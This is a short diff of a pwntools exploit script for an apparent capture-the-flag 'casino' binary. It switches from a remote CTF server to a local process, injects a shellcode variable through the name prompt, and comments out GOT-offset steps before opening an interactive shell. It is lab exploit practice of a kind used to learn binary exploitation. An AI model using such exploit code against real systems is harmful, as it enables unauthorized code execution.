@@ -14,10 +14,11 @@ p.close()
 
 
 # send
-# r = process("./casino")
+r = process("./casino")
 # elf = ELF("./casino")
-r = remote('edu-ctf.csie.org', 10172)
-r.sendlineafter('name: ', 'AAAAAA')
+# r = remote('edu-ctf.csie.org', 10172)
+print('sc ', sc)
+r.sendlineafter('name: ', sc)
 r.sendlineafter('age: ', '40')
 
 # offset = (elf.got['printf'] - elf.bss['guess'])
@@ -29,15 +30,15 @@ for cnt_try in range(0, 2):
     for i in numbers:
         r_out = 'Chose the number ' + str(cnt_num) + ': '
         r.sendlineafter(r_out, i)
+        print('sending number ', i)
         cnt_num += 1
 
     r.recvuntil(':no]: ')
-    r.sendline('1')
+    r.sendline('0')
 
-    r.recvuntil('[1 ~ 6]: ')
-    r.sendline(str(offset + 1))
-    r.recvuntil(': ')
-    r.sendline(sc)
+    # r.recvuntil('[1 ~ 6]: ')
+    # r.sendline(str(offset + 1))
+    # r.recvuntil(': ')
 
 r.interactive()
 r.close()
